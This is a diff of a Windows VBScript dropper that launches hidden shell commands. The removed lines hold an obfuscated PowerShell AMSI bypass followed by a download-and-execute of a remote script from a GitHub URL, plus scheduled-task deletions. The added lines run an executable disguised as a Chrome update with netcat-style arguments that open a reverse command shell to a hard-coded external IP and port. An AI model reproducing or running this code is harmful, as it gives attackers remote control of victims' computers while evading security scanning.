@@ -1,8 +1,4 @@
-Set Fourshell = wscript.createobject("wscript.shell")
-Fourshell.run "powershell -ep bypass -noprofile -win hid {[Ref].Assembly.GetType('System.Management.Automation.'+$([sYStem.neT.wEButiLITY]::hTmlDecOdE('&#65;&#109;&#115;&#105;'))+'Utils').GetField($([ChaR]([bYTE]0x61)+[ChAR]([BytE]0x6D)+[cHAr](201-86)+[CHaR]([byTe]0x69)+[Char](4745/65)+[CHAr]([ByTE]0x6E)+[cHar]([bytE]0x69)+[chaR]([bYtE]0x74)+[chAr](2800/40)+[ChaR]([ByTe]0x61)+[CHar](189-84)+[chAR]([bYTE]0x6C)+[CHAR](1515/15)+[cHAr](6900/69)),'NonPublic,Static').SetValue($null,$true)}; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/blackswanfinal.ps1')", 0, False
+Set OOshell = wscript.createobject("wscript.shell")
+OOshell.run "%USERPROFILE%\downloads\chrome10update.exe -nv 3.22.30.40 22056 -e cmd", 0, False
 
-Set FiveShell = createobject("wscript.shell")
-FiveShell.Run "schtasks /delete /tn 1part /F", 0, False
 
-Set SixShell = createobject("wscript.shell")
-SixShell.Run "schtasks /delete /tn 2part /F", 0, False
